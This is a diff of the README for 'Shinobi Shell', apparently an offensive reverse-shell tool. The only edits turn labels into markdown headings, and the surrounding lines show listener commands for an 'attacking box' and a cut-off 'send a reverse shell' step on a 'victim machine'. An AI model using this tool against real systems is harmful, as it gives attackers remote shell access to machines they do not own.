@@ -19,7 +19,7 @@ optional arguments:
 ```
 ## Start your server first:
 
-Server (Attacking box) 
+### Server (Attacking box) 
 `./shinobishell.py -l 4443 -k`
 
 `-l` Port server will listen on
@@ -44,7 +44,7 @@ Both `-c` and `-k` were moved to runtime inputs to prevent leaking attacking mac
 
 ## OPTION 2: Start a Shinobi Shell listener on your attacking machine and send it a shell
 
-Attacking Machine
+### Attacking Machine
 
 `./shinobishell.py -a`
 > Shinobi Tunnel Plaintext ~~ Be aware
@@ -54,7 +54,7 @@ Attacking Machine
 > What is the ShinobiServer address:port combination: 127.0.0.1:443
 
 
-Victim Machine
+### Victim Machine
 
 Send a reverse shell 
 
